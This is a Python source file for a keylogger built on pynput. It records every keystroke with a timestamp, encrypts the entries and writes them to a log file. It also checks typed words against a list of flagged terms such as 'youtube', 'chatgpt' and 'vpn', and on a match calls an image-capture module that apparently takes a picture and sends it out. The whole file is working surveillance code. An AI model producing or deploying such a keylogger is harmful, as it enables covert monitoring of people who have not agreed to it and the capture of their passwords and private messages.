from pynput import keyboard
from datetime import datetime
from encryption import encrypt_data
import os
import requests

# Define the logs folder path
LOGS_FOLDER = os.path.join("keylogger", "logs")

# Create the logs folder if it doesn't exist
if not os.path.exists(LOGS_FOLDER):
    os.makedirs(LOGS_FOLDER)
    print(f"Created logs folder at: {os.path.abspath(LOGS_FOLDER)}")

# List of flagged words
FLAGGED_WORDS =["youtube", "instagram", "Games", 
                 "ipl","movies","webseries",
                 "anime","flipkart","chatgpt","whatsapp",
                 "vpn","answers","music","openai","copilot","facebook",]  # Add your flagged words here

# Track the current word being typed
current_word = ""

def on_press(key):
    global current_word

    try:
        # Append the character to the current word
        current_word += key.char
    except AttributeError:
        
        # Handle special keys (e.g., backspace, space, enter)
        if key == keyboard.Key.backspace:
            # Remove the last character from the current word
            current_word = current_word[:-1]
        elif key == keyboard.Key.space or key == keyboard.Key.enter:
            # Reset the current word if space or enter is pressed
            current_word = ""
        # Ignore other special keys (e.g., Shift, Ctrl, etc.)

    # Check if the current word matches any flagged word
    for flagged_word in FLAGGED_WORDS:
        # Remove spaces and convert to lowercase for comparison
        if flagged_word == current_word.replace(" ", "").lower():
            print(f"Flagged word detected: {flagged_word}")
            # Notify the image capture module
            from image_capture import capture_and_send_image
            capture_and_send_image(flagged_word, current_word)  # Pass both arguments
            # Reset the current word after detection
            current_word = ""
            break  # Exit the loop after detecting a flagged word

    # Log the keystroke
    log_entry = f"{datetime.now()}: {key}\n"
    encrypted_log = encrypt_data(log_entry)
    with open(os.path.join(LOGS_FOLDER, "keystrokes.log"), "a") as f:
        f.write(encrypted_log + "\n")
    print(f"Logged: {log_entry.strip()}")

def on_release(key):
    pass  # No action needed on key release

def start_logger():
    print("Keylogger thread started.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()